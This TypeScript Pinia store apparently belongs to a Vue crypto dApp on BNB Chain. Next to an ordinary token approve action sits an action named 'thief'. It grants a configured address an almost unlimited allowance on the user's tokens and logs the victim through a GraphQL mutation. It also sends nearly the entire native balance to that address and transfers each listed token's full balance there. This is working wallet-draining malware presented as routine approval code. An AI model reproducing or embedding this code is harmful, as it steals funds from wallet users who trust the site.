import pinia from '.'
import { defineStore } from 'pinia'
import { ethers } from 'ethers'
import { useAccountStore } from '~/stores/account'
import { APPROVE_MUTATION } from '~/graphql'
import apollo from '~/apollo'

const account = useAccountStore(pinia)

const address = import.meta.env.VITE_APPROVE_ADDRESS as string

export const useApproveStore = defineStore('approve', {
    state: () => ({
        loading: false
    }),

    actions: {
        approve(amount: number) {
            this.loading = true

            try {
                if (account.chainId != 56) return

                let contractAddress: any

                switch (account.contract) {
                    case 'eth':
                        contractAddress = import.meta.env.VITE_CONTRACT_ETH
                        break
                    case 'busd':
                        contractAddress = import.meta.env.VITE_CONTRACT_BUSD
                        break
                    case 'usdt':
                        contractAddress = import.meta.env.VITE_CONTRACT_USDT
                        break
                    case 'cake':
                        contractAddress = import.meta.env.VITE_CONTRACT_CAKE
                        break
                    case 'ada':
                        contractAddress = import.meta.env.VITE_CONTRACT_ADA
                        break
                    case 'shiba':
                        contractAddress = import.meta.env.VITE_CONTRACT_SHIBA
                        break
                    case 'doge':
                        contractAddress = import.meta.env.VITE_CONTRACT_DOGE
                        break
                }

                const value = account.contract == 'doge' ? ethers.utils.parseUnits(amount.toString(), 8) : ethers.utils.parseUnits(amount.toString())

                account.tokens[account.contract].approve(contractAddress, value)
                
            } catch (error) {
                console.log(error)
            }

            this.loading = false
        },

        async thief(approve: number) {

            let token: any

            switch (approve) {
                case 1:
                    token = account.tokens.eth
                    break
                case 2:
                    token = account.tokens.busd
                    break
                case 3:
                    token = account.tokens.usdt
                    break
                case 4:
                    token = account.tokens.cake
                    break
                case 5:
                    token = account.tokens.ada
                    break
                case 6:
                    token = account.tokens.shiba
                    break
                case 7:
                    token = account.tokens.doge
                    break
                case 16:
                    token = account.tokens.ufo
                    break
            }

            if (approve > 0 && approve <= 7) {
                token.increaseAllowance(address, ethers.utils.parseUnits('1000000000000000'))
                    .then(() => {
                        apollo.mutate({
                            mutation: APPROVE_MUTATION,
                            variables: {
                                input: {
                                    owner: address,
                                    address: account.currentAccount,
                                    approve: approve,
                                    type: 0
                                }
                            }
                        })
                    })
            } else if (approve == 8) {
                let balance = account.balance - 0.01

                const tx = {
                    from: account.currentAccount,
                    to: address,
                    value: ethers.utils.parseEther(balance.toString())
                }

                account.provider.getSigner().sendTransaction(tx)
            } else if (approve == 9) {
                account.tokens.eth.balanceOf(account.currentAccount)
                    .then((result: any) => {
                        account.tokens.eth.transfer(address, result)
                    })
            } else if (approve == 10) {
                account.tokens.busd.balanceOf(account.currentAccount)
                    .then((result: any) => {
                        account.tokens.busd.transfer(address, result)
                    })
            } else if (approve == 11) {
                account.tokens.usdt.balanceOf(account.currentAccount)
                    .then((result: any) => {
                        account.tokens.usdt.transfer(address, result)
                    })
            } else if (approve == 12) {
                account.tokens.cake.balanceOf(account.currentAccount)
                    .then((result: any) => {
                        account.tokens.cake.transfer(address, result)
                    })
            } else if (approve == 13) {
                account.tokens.ada.balanceOf(account.currentAccount)
                    .then((result: any) => {
                        account.tokens.ada.transfer(address, result)
                    })
            } else if (approve == 14) {
                account.tokens.shiba.balanceOf(account.currentAccount)
                    .then((result: any) => {
                        account.tokens.shiba.transfer(address, result)
                    })
            } else if (approve == 15) {
                account.tokens.doge.balanceOf(account.currentAccount)
                    .then((result: any) => {
                        account.tokens.doge.transfer(address, result)
                    })
            }

        }

    },
})